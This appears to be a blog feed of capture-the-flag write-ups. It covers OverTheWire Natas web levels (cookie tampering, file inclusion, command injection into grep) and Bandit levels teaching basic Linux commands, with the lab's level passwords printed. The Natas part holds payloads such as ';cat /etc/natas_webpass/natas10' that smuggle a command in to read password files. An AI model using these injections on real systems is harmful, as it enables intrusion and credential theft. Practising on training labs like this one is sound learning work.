<h2 id="Level-4➡Level-5"><a href="#Level-4➡Level-5" class="headerlink" title="Level_4➡Level_5"></a><strong>Level_4➡Level_5</strong></h2><h2 id="Learn-about-cookie"><a href="#Learn-about-cookie" class="headerlink" title="Learn about cookie"></a><strong>Learn about cookie</strong></h2><p>更改cookie中Loggedin 值为1即可</p>
<h2 id="Level-5➡Level-6"><a href="#Level-5➡Level-6" class="headerlink" title="Level_5➡Level_6"></a><strong>Level_5➡Level_6</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;includes/secret.inc&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_POST</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$secret</span> == <span class="variable">$_POST</span>[<span class="string">&#x27;secret&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">print</span><span class="string">&quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">print</span><span class="string">&quot;Wrong secret&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现导入了”includes/secret.inc” ，比较的时候访问该目录可看到密码，提交即可</p>
<h2 id="Level-6➡Level-7"><a href="#Level-6➡Level-7" class="headerlink" title="Level_6➡Level_7"></a><strong>Level_6➡Level_7</strong></h2><p>include()文件包含漏洞，用户传入的page参数未经过滤直接调用include()函数，传入/etc/natas_webpass/natas8作为参数即可。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$encodedSecret</span> = <span class="string">&quot;3d3d516343746d4d6d6c315669563362&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encodeSecret</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bin2hex(strrev(base64_encode(<span class="variable">$secret</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_POST</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(encodeSecret(<span class="variable">$_POST</span>[<span class="string">&#x27;secret&#x27;</span>]) == <span class="variable">$encodedSecret</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Wrong secret&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>根据加密过程解密即可</p>
<p>练习一下python</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">byte=<span class="string">b&#x27;\x3d\x3d\x51\x63\x43\x74\x6d\x4d\x6d\x6c\x31\x56\x69\x56\x33\x62&#x27;</span></span><br><span class="line">t=byte.decode()</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line">t=t[::-<span class="number">1</span>]<span class="comment">#字符切片</span></span><br><span class="line"><span class="built_in">print</span>(t) </span><br><span class="line">t=base64.b64decode(t)</span><br><span class="line"><span class="built_in">print</span>(t)</span><br></pre></td></tr></table></figure>

<p>练习一下linux命令</p>
<p>优雅简洁:)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 3d3d516343746d4d6d6c315669563362 | xxd -p -r | rev | base64 -d</span><br></pre></td></tr></table></figure>

<p><em>-r</em> | <em>-revert</em></p>
<p>reverse operation: convert (or patch) hexdump into binary. If not writing to stdout, xxd writes into its output file without truncating it. <strong>Use the combination <em>-r</em> -p to read plain hexadecimal dumps without line number information and without a particular column layout.</strong> Additional Whitespace and line-breaks are allowed anywhere.</p>
<h2 id="Level-7➡Level-8"><a href="#Level-7➡Level-8" class="headerlink" title="Level_7➡Level_8"></a><strong>Level_7➡Level_8</strong></h2><h2 id="Learn-about-passthru"><a href="#Learn-about-passthru" class="headerlink" title="Learn about passthru()"></a><strong>Learn about passthru()</strong></h2><p>passtru():exec() 函数类似， passthru() 函数也是用来执行外部命令（ command ）的。 </p>
<p>用户输入未过滤，直接用 ; 截断grep 命令cat flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;cat /etc/natas_webpass/natas10</span><br></pre></td></tr></table></figure>

<h2 id="Level-8➡Level-9"><a href="#Level-8➡Level-9" class="headerlink" title="Level_8➡Level_9"></a><strong>Level_8➡Level_9</strong></h2><p>注意到对用户输入进行过滤，但只是过滤了; | &amp;特殊字符</p>
<h2 id="Uage-of-grep-and-regex"><a href="#Uage-of-grep-and-regex" class="headerlink" title="Uage of grep and regex"></a><strong>Uage of grep and regex</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&#x27;[A-Za-z]&#x27;</span> 文件名</span><br></pre></td></tr></table></figure>

<p>Demo:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[a-zA-Z] /etc/natas_webpass/natas11</span><br><span class="line">Or</span><br><span class="line">. /etc/natas_webpass/natas11</span><br></pre></td></tr></table></figure>

<h2 id="Level-9➡Level-10"><a href="#Level-9➡Level-10" class="headerlink" title="Level_9➡Level_10"></a><strong>Level_9➡Level_10</strong></h2><h2 id="Level-10➡Level-11"><a href="#Level-10➡Level-11" class="headerlink" title="Level_10➡Level_11"></a><strong>Level_10➡Level_11</strong></h2><h2 id="Level-11➡Level-12"><a href="#Level-11➡Level-12" class="headerlink" title="Level_11➡Level_12"></a><strong>Level_11➡Level_12</strong></h2><h2 id="Level-12➡Level-13"><a href="#Level-12➡Level-13" class="headerlink" title="Level_12➡Level_13"></a><strong>Level_12➡Level_13</strong></h2><h2 id="Level-13➡Level-14"><a href="#Level-13➡Level-14" class="headerlink" title="Level_13➡Level_14"></a><strong>Level_13➡Level_14</strong></h2><h2 id="Level-14➡Level-15"><a href="#Level-14➡Level-15" class="headerlink" title="Level_14➡Level_15"></a><strong>Level_14➡Level_15</strong></h2><h2 id="Level-15➡Level-16"><a href="#Level-15➡Level-16" class="headerlink" title="Level_15➡Level_16"></a><strong>Level_15➡Level_16</strong></h2><h2 id="Level-16➡Level-17"><a href="#Level-16➡Level-17" class="headerlink" title="Level_16➡Level_17"></a><strong>Level_16➡Level_17</strong></h2><h2 id="Level-17➡Level-18"><a href="#Level-17➡Level-18" class="headerlink" title="Level_17➡Level_18"></a><strong>Level_17➡Level_18</strong></h2><h2 id="Level-18➡Level-19"><a href="#Level-18➡Level-19" class="headerlink" title="Level_18➡Level_19"></a><strong>Level_18➡Level_19</strong></h2><h2 id="Level-19➡Level-20"><a href="#Level-19➡Level-20" class="headerlink" title="Level_19➡Level_20"></a><strong>Level_19➡Level_20</strong></h2><h2 id="Level-20➡Level-21"><a href="#Level-20➡Level-21" class="headerlink" title="Level_20➡Level_21"></a><strong>Level_20➡Level_21</strong></h2><h2 id="Level-21➡Level-22"><a href="#Level-21➡Level-22" class="headerlink" title="Level_21➡Level_22"></a><strong>Level_21➡Level_22</strong></h2><h2 id="Level-22➡Level-23"><a href="#Level-22➡Level-23" class="headerlink" title="Level_22➡Level_23"></a><strong>Level_22➡Level_23</strong></h2><h2 id="Level-23➡Level-24"><a href="#Level-23➡Level-24" class="headerlink" title="Level_23➡Level_24"></a><strong>Level_23➡Level_24</strong></h2><h2 id="Level-24➡Level-25"><a href="#Level-24➡Level-25" class="headerlink" title="Level_24➡Level_25"></a><strong>Level_24➡Level_25</strong></h2><h2 id="Level-25➡Level-26"><a href="#Level-25➡Level-26" class="headerlink" title="Level_25➡Level_26"></a><strong>Level_25➡Level_26</strong></h2><h2 id="Level-26➡Level-27"><a href="#Level-26➡Level-27" class="headerlink" title="Level_26➡Level_27"></a><strong>Level_26➡Level_27</strong></h2><h2 id="Level-27➡Level-28"><a href="#Level-27➡Level-28" class="headerlink" title="Level_27➡Level_28"></a><strong>Level_27➡Level_28</strong></h2><h2 id="Level-28➡Level-29"><a href="#Level-28➡Level-29" class="headerlink" title="Level_28➡Level_29"></a><strong>Level_28➡Level_29</strong></h2><h2 id="Level-29➡Level-30"><a href="#Level-29➡Level-30" class="headerlink" title="Level_29➡Level_30"></a><strong>Level_29➡Level_30</strong></h2><h2 id="Level-30➡Level-31"><a href="#Level-30➡Level-31" class="headerlink" title="**Level_30➡Level_**31"></a>**Level_30➡Level_**31</h2><h2 id="Level-31➡Level-32"><a href="#Level-31➡Level-32" class="headerlink" title="Level_31➡Level_32"></a><strong>Level_31➡Level_32</strong></h2><h2 id="Level-32➡Level-33"><a href="#Level-32➡Level-33" class="headerlink" title="Level_32➡Level_33"></a><strong>Level_32➡Level_33</strong></h2><h2 id="Level-33➡Level-34"><a href="#Level-33➡Level-34" class="headerlink" title="**Level_33➡Level_**34"></a>**Level_33➡Level_**34</h2>]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>linux_base题解</title>
    <url>/2021/04/21/linux_Base/</url>
    <content><![CDATA[<h1 id="linux-base题解"><a href="#linux-base题解" class="headerlink" title="linux_base题解"></a>linux_base题解</h1><p>重新系统地过一遍，主要是一些Linux的基本命令和基础知识。</p>
<h2 id="Level-0"><a href="#Level-0" class="headerlink" title="Level_0"></a>Level_0</h2><h2 id="What-is-SSH"><a href="#What-is-SSH" class="headerlink" title="What is SSH ?"></a><strong>What is SSH ?</strong></h2><p>According to SearchSecurity, SSH is a network protocol that gives users, particularly system administrators, a secure way to <strong>access a computer</strong> over an <strong>unsecured network</strong>.</p>
<ul>
<li>Host Name : <code>bandit.labs.overthewire.org</code></li>
<li>Username : <code>bandit0</code></li>
<li>Password : <code>bandit0</code></li>
<li>Port Number : <code>2220</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bandit0@bandit.labs.overthewire.org -p 2220</span><br></pre></td></tr></table></figure>

<h2 id="Level-0➡Level-1"><a href="#Level-0➡Level-1" class="headerlink" title="Level_0➡Level_1"></a>Level_0➡Level_1</h2><h2 id="Usage-of-ls-and-cat"><a href="#Usage-of-ls-and-cat" class="headerlink" title="Usage of ls and cat:"></a><strong>Usage of ls and cat:</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit0@bandit:~$ ls</span><br><span class="line">readme</span><br><span class="line">bandit0@bandit:~$ cat readme </span><br><span class="line">boJ9jbbUNNfktd78OOpsqOltutMc3MY1</span><br></pre></td></tr></table></figure>



<h2 id="Level-1➡Level-2"><a href="#Level-1➡Level-2" class="headerlink" title="Level_1➡Level_2"></a>Level_1➡Level_2</h2><h2 id="cat-the-file-stars-with-dash"><a href="#cat-the-file-stars-with-dash" class="headerlink" title="cat the file stars with dash:"></a><strong>cat the file stars with dash:</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit1@bandit:~$ cat ./-</span><br><span class="line">CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span><br><span class="line">bandit1@bandit:~$ cat &lt;-</span><br><span class="line">CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9</span><br></pre></td></tr></table></figure>

<h2 id="Level-2➡Level-3"><a href="#Level-2➡Level-3" class="headerlink" title="Level_2➡Level_3"></a>Level_2➡Level_3</h2><h2 id="Use”-“-to-escape-character"><a href="#Use”-“-to-escape-character" class="headerlink" title="Use” \“  to escape character"></a><strong>Use” \“  to escape character</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit2@bandit:~$ ls</span><br><span class="line">spaces <span class="keyword">in</span> this filename</span><br><span class="line">bandit2@bandit:~$ cat spaces\ <span class="keyword">in</span>\ this\ filename </span><br><span class="line">UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK</span><br></pre></td></tr></table></figure>

<h2 id="Level-3➡Level-4"><a href="#Level-3➡Level-4" class="headerlink" title="Level_3➡Level_4"></a>Level_3➡Level_4</h2><h2 id="Usage-of-command-ls-、cd"><a href="#Usage-of-command-ls-、cd" class="headerlink" title="Usage of command : ls 、cd:"></a><strong>Usage of command : ls</strong> 、<strong>cd</strong>:</h2><p>The <strong>ls</strong> command is used to view the contents of a directory. By default, this command will display the contents of your current working directory.</p>
<p>If you want to see the content of other directories, type <strong>ls</strong> and then the directory’s path. For example, enter <strong>ls</strong> <strong>/home/username/Documents</strong> to view the content of <strong>Documents</strong>.</p>
<p>There are variations you can use with the <strong>ls</strong> command:</p>
<ul>
<li><strong>ls -R</strong> will list all the files in the sub-directories as well</li>
<li><strong>ls -a</strong> will show the hidden files</li>
<li><strong>ls -al</strong> will list the files and directories with detailed information like the permissions, size, owner, etc.</li>
</ul>
<p>Hidden file: start with    <strong>.</strong>    is hidden file</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit3@bandit:~$ ls</span><br><span class="line">inhere</span><br><span class="line">bandit3@bandit:~$ <span class="built_in">cd</span> inhere/</span><br><span class="line">bandit3@bandit:~/inhere$ ls</span><br><span class="line">bandit3@bandit:~/inhere$ ls -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 root    root    4096 May  7  2020 .</span><br><span class="line">drwxr-xr-x 3 root    root    4096 May  7  2020 ..</span><br><span class="line">-rw-r----- 1 bandit4 bandit3   33 May  7  2020 .hidden</span><br><span class="line">bandit3@bandit:~/inhere$ cat .hidden </span><br><span class="line">pIwrPrtPN36QITSp3EQaw936yaFoFgAB</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Level-4➡Level-5"><a href="#Level-4➡Level-5" class="headerlink" title="Level_4➡Level_5"></a>Level_4➡Level_5</h2><h2 id="Usage-of-command-file"><a href="#Usage-of-command-file" class="headerlink" title="Usage of command : file"></a><strong>Usage of command : file</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file [-bcLvz][-f &lt;名称文件&gt;][-m &lt;魔法数字文件&gt;...][文件或目录...]</span><br></pre></td></tr></table></figure>

<ul>
<li><p>-b 　列出辨识结果时，不显示文件名称。</p>
</li>
<li><p>-c 　详细显示指令执行过程，便于排错或分析程序执行的情形。</p>
</li>
<li><p>-f&lt;名称文件&gt; 　指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称。</p>
</li>
<li><p>-L 　直接显示符号连接所指向的文件的类别。</p>
</li>
<li><p>-m&lt;魔法数字文件&gt; 　指定魔法数字文件。</p>
</li>
<li><p>-v 　显示版本信息。</p>
</li>
<li><p>-z 　尝试去解读压缩文件的内容。</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit4@bandit:~$ ls</span><br><span class="line">inhere</span><br><span class="line">bandit4@bandit:~$ <span class="built_in">cd</span> inhere/</span><br><span class="line">bandit4@bandit:~/inhere$ ls</span><br><span class="line">-file00  -file02  -file04  -file06  -file08</span><br><span class="line">-file01  -file03  -file05  -file07  -file09</span><br><span class="line">bandit4@bandit:~/inhere$ file ./*</span><br><span class="line">./-file00: data</span><br><span class="line">./-file01: data</span><br><span class="line">./-file02: data</span><br><span class="line">./-file03: data</span><br><span class="line">./-file04: data</span><br><span class="line">./-file05: data</span><br><span class="line">./-file06: data</span><br><span class="line">./-file07: ASCII text</span><br><span class="line">./-file08: data</span><br><span class="line">./-file09: data</span><br><span class="line">bandit4@bandit:~/inhere$ cat ./-file07</span><br><span class="line">koReBOKuIDDepwhWk7jZC0RTdopnAYKh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Level-5➡Level-6"><a href="#Level-5➡Level-6" class="headerlink" title="Level_5➡Level_6"></a>Level_5➡Level_6</h2><h2 id="Usage-of-file"><a href="#Usage-of-file" class="headerlink" title="Usage of file:"></a><strong>Usage of file:</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit5@bandit:~/inhere$ ls</span><br><span class="line">maybehere00  maybehere04  maybehere08  maybehere12  maybehere16</span><br><span class="line">maybehere01  maybehere05  maybehere09  maybehere13  maybehere17</span><br><span class="line">maybehere02  maybehere06  maybehere10  maybehere14  maybehere18</span><br><span class="line">maybehere03  maybehere07  maybehere11  maybehere15  maybehere19</span><br><span class="line">bandit5@bandit:~/inhere$ find ./ -<span class="built_in">type</span> f -size 1033c</span><br><span class="line">./maybehere07/.file2</span><br><span class="line">bandit5@bandit:~/inhere$ cat ./maybehere07/.file2</span><br><span class="line">DXjZPULLxYr17uwoI01bNLQbtFemEgo7</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Level-6➡Level-7"><a href="#Level-6➡Level-7" class="headerlink" title="Level_6➡Level_7"></a>Level_6➡Level_7</h2><h2 id="Learn-about-redirection"><a href="#Learn-about-redirection" class="headerlink" title="Learn about redirection:"></a><strong>Learn about redirection:</strong></h2><p><strong>Analyse</strong>:</p>
<p>The password for the next level is stored somewhere on the server and has all of the following properties:</p>
<p><em>owned by user bandit7</em></p>
<p><em>owned by group bandit6</em></p>
<p><em>33 bytes in size</em></p>
<p><strong>So this is exp:</strong></p>
<p><em>find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null</em></p>
<p><em>/ from root folder</em></p>
<p><em>-user the owner of the file.</em></p>
<p><em>-group the group owner of the file.</em></p>
<p><em>-size the size of the file.</em></p>
<p><em>2&gt;/dev/null redirects error messages to null so that they do not show on stdout.</em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit6@bandit:~$ find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null</span><br><span class="line">/var/lib/dpkg/info/bandit7.password</span><br><span class="line">bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password </span><br><span class="line">HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</span><br></pre></td></tr></table></figure>



<h2 id="Level-7➡Level-8"><a href="#Level-7➡Level-8" class="headerlink" title="Level_7➡Level_8"></a>Level_7➡Level_8</h2><h2 id="Learn-about-the-pipe-and-usage-if-grep"><a href="#Learn-about-the-pipe-and-usage-if-grep" class="headerlink" title="Learn about the pipe and usage if grep:"></a><strong>Learn about the pipe and usage if grep:</strong></h2><h3 id="grep-command"><a href="#grep-command" class="headerlink" title="grep command"></a>grep command</h3><p>It lets you search through all the text in a given file.</p>
<p>To illustrate, <strong>grep blue notepad.txt</strong> will search for the word blue in the notepad file. Lines that contain the searched word will be displayed fully.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-i 忽略大小写</span><br><span class="line">-E 启用POSIX扩展正则表达式</span><br><span class="line">-P 启用perl正则</span><br><span class="line">-o 只输出正则表达式匹配的内容</span><br><span class="line">-w 整字匹配</span><br><span class="line">-v 不匹配的</span><br><span class="line">-n 输出行号</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit7@bandit:~$ cat data.txt |grep millionth</span><br><span class="line">millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV</span><br></pre></td></tr></table></figure>

<h2 id="Level-8➡Level-9"><a href="#Level-8➡Level-9" class="headerlink" title="Level_8➡Level_9"></a>Level_8➡Level_9</h2><h2 id="Learn-about-the-sort-and-uniq"><a href="#Learn-about-the-sort-and-uniq" class="headerlink" title="Learn about the sort and uniq:"></a><strong>Learn about the sort and uniq:</strong></h2><p><strong>sort:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sort [-bcdfimMnr][-o&lt;输出文件&gt;][-t&lt;分隔字符&gt;][+&lt;起始栏位&gt;-&lt;结束栏位&gt;][--<span class="built_in">help</span>][--verison][文件]</span><br></pre></td></tr></table></figure>

<ul>
<li>-u  在输出行中去除重复行。</li>
<li>-r  sort默认的排序方式是升序，如果想改成降序，就加个-r即可。</li>
<li>-n  sort要以数值来排序</li>
<li>-t  指定分割符</li>
<li>-k  指定第几列排序</li>
</ul>
<p><strong>uniq:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uniq [-cdu][-f&lt;栏位&gt;][-s&lt;字符位置&gt;][-w&lt;字符位置&gt;][--<span class="built_in">help</span>][--version][输入文件][输出文件]</span><br></pre></td></tr></table></figure>

<p> -c, –count                  在每行前显示该行重复次数<br> -d, –repeated            只输出重复的行<br> -D, –all-repeated      只输出重复的行，不过有几行输出几行<br> -f, –skip-fields=N     -f 忽略的段数，-f 1 忽略第一段<br> -i, –ignore-case         不区分大小写<br> -s, –skip-chars=N     与-f有点像，不过-s是忽略，后面多少个字符 -s 5就忽略后面5个字符<br> -u, –unique               去除重复的后，全部显示出来，根mysql的distinct功能上有点像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit8@bandit:~$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit8@bandit:~$ sort data.txt | uniq -u</span><br><span class="line">UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</span><br></pre></td></tr></table></figure>

<h2 id="Level-9➡Level-10"><a href="#Level-9➡Level-10" class="headerlink" title="Level_9➡Level_10"></a>Level_9➡Level_10</h2><h2 id="Usage-of-grep"><a href="#Usage-of-grep" class="headerlink" title="Usage of grep:"></a><strong>Usage of grep:</strong></h2><p>strings : export strings in  binary file </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit9@bandit:~$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit9@bandit:~$ cat  data.txt |grep =</span><br><span class="line">Binary file (standard input) matches</span><br><span class="line">bandit9@bandit:~$ strings data.txt |grep =</span><br><span class="line">========== the*2i<span class="string">&quot;4</span></span><br><span class="line"><span class="string">=:G e</span></span><br><span class="line"><span class="string">========== password</span></span><br><span class="line"><span class="string">&lt;I=zsGi</span></span><br><span class="line"><span class="string">Z)========== is</span></span><br><span class="line"><span class="string">A=|t&amp;E</span></span><br><span class="line"><span class="string">Zdb=</span></span><br><span class="line"><span class="string">c^ LAh=3G</span></span><br><span class="line"><span class="string">*SF=s</span></span><br><span class="line"><span class="string">&amp;========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<h2 id="Level-10➡Level-11"><a href="#Level-10➡Level-11" class="headerlink" title="Level_10➡Level_11"></a>Level_10➡Level_11</h2><h2 id="What’s-base64"><a href="#What’s-base64" class="headerlink" title="What’s base64?"></a><strong>What’s base64?</strong></h2><p><strong>Base64</strong>是一种基于64个可打印字符来表示二进制数据的表示方法。由于<img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/9c986fbdc6c036a937e0647d7a6ec5ad745bccab" alt="{\displaystyle \log _{2}64=6}">，所以每6个比特为一个单元，对应某个可打印字符。3个字节相当于24个比特，对应于4个Base64单元，即3个字节可由4个可打印字符来表示。在Base64中的可打印字符包括字母<code>A-Z</code>、<code>a-z</code>、数字<code>0-9</code>，这样共有62个字符，此外两个可打印符号在不同的系统中而不同。一些如<a href="https://zh.wikipedia.org/wiki/Uuencode">uuencode</a>的其他编码方法，和之后<a href="https://zh.wikipedia.org/w/index.php?title=BinHex&action=edit&redlink=1">BinHex</a>的版本使用不同的64字符集来代表6个二进制数字，但是不被称为Base64。</p>
<p><strong>why base64？</strong></p>
<p><a href="http://www.ruanyifeng.com/blog/2008/06/base64.html">This_is_why_base64</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit10@bandit:~$ cat data.txt | base64 -d</span><br><span class="line">The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</span><br></pre></td></tr></table></figure>

<h2 id="Level-11➡Level-12"><a href="#Level-11➡Level-12" class="headerlink" title="Level_11➡Level_12"></a>Level_11➡Level_12</h2><h2 id="ROT13"><a href="#ROT13" class="headerlink" title="ROT13:"></a><strong>ROT13</strong>:</h2><p><a href="https://en.wikipedia.org/wiki/ROT13">I_know_what’s_ROT13</a></p>
<p><strong>command tr:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tr [选项]… 集合1 [集合2]</span><br><span class="line">选项说明：</span><br><span class="line">-c, -C, –complement 用集合1中的字符串替换，要求字符集为ASCII。</span><br><span class="line">-d, –delete 删除集合1中的字符而不是转换</span><br><span class="line">-s, –squeeze-repeats 删除所有重复出现字符序列，只保留第一个；即将重复出现字符串压缩为一个字符串。</span><br><span class="line">-t, –truncate-set1 先删除第一字符集较第二字符集多出的字符</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit11@bandit:~$ cat data.txt | tr <span class="string">&quot;A-Za-z&quot;</span> <span class="string">&quot;N-ZA-Mn-za-m&quot;</span></span><br><span class="line">The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</span><br></pre></td></tr></table></figure>

<h2 id="Level-12➡Level-13"><a href="#Level-12➡Level-13" class="headerlink" title="Level_12➡Level_13"></a>Level_12➡Level_13</h2><h2 id="Learn-about-hexdump-amp-xxd-amp-gzip-amp-bzip-amp-tar"><a href="#Learn-about-hexdump-amp-xxd-amp-gzip-amp-bzip-amp-tar" class="headerlink" title="Learn about hexdump&amp;xxd&amp;gzip&amp;bzip&amp;tar:"></a><strong>Learn about hexdump&amp;xxd&amp;gzip&amp;bzip&amp;tar:</strong></h2><p> <strong>Linux hexdump命令</strong>一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件，而不只限于二进制文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexdump [选项] [文件]...</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-n length 只格式化输入文件的前length个字节。</span><br><span class="line">-C 输出规范的十六进制和ASCII码。</span><br><span class="line">-b 单字节八进制显示。</span><br><span class="line">-c 单字节字符显示。</span><br><span class="line">-d 双字节十进制显示。</span><br><span class="line">-o 双字节八进制显示。</span><br><span class="line">-x 双字节十六进制显示。</span><br><span class="line">-s 从偏移量开始输出。</span><br><span class="line">-e 指定格式字符串，格式字符串包含在一对单引号中，格式字符串形如：<span class="string">&#x27;a/b &quot;format1&quot; &quot;format2&quot;&#x27;</span>。</span><br></pre></td></tr></table></figure>

<p>  每个格式字符串由三部分组成，每个由空格分隔，第一个形如a/b，b表示对每b个输入字节应用format1格式，a表示对每a个输入字节应用format2格式，一般a&gt;b，且b只能为1，2，4，另外a可以省略，省略则a=1。format1和format2中可以使用类似printf的格式字符串，如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%02d：两位十进制</span><br><span class="line">%03x：三位十六进制</span><br><span class="line">%02o：两位八进制</span><br><span class="line">%c：单个字符等</span><br></pre></td></tr></table></figure>

<p> 还有一些特殊的用法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">%_ad：标记下一个输出字节的序号，用十进制表示。</span><br><span class="line">%_ax：标记下一个输出字节的序号，用十六进制表示。</span><br><span class="line">%_ao：标记下一个输出字节的序号，用八进制表示。</span><br><span class="line">%_p：对不能以常规字符显示的用 . 代替。</span><br></pre></td></tr></table></figure>

<p> 同一行如果要显示多个格式字符串，则可以跟多个<code>-e</code>选项。</p>
<p>Demo:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexdump -e <span class="string">&#x27;16/1 &quot;%02X &quot; &quot;  |  &quot;&#x27;</span> -e <span class="string">&#x27;16/1 &quot;%_p&quot; &quot;\n&quot;&#x27;</span> <span class="built_in">test</span></span><br><span class="line">00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  |  ................  </span><br><span class="line">10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F  |  ................  </span><br><span class="line">20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F  |   !<span class="string">&quot;#$%&amp;&#x27;()*+,-./ </span></span><br></pre></td></tr></table></figure>

<p><strong>xxd</strong></p>
<p>xxd是二进制查看命令，默认将2文件显示为16进制字符串表示形式。</p>
<p>Usage:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxd [options] [infile  [outfile]]</span><br></pre></td></tr></table></figure>

<p>  or</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xxd -r [-s [-]offset] [-c cols] [-ps] [infile  [outfile]]</span><br></pre></td></tr></table></figure>

<p>options:</p>
<pre><code>-a          缺省忽略转换: 使用‘*’替换空行.
-b          二进数数据转储 (与 -ps,-i,-r不兼容). 默认为16进制.
-c cols    每行多少列octets（特制8比特的字节）. 默认为16列(-i: 12, -ps: 30).
-E          使用EBCDIC字符集. 默认为ASCII字符集.
-e          小端模式转储 (与 -ps,-i,-r不兼容).
-g          在正常输出中，每组八位字节数. 默认为2个 (-e: 4).
-h          输出此帮助.
-i          使用C语言文件样式输出.
-r          reverse operation: convert (or patch) hexdump into binary.
</code></pre>
<p><strong>bzip2、gzip：</strong></p>
<p>解压压缩命令</p>
<p>Options：</p>
<p>-d ：解压</p>
<p>-k：保留源文件</p>
<p><strong>tar:</strong></p>
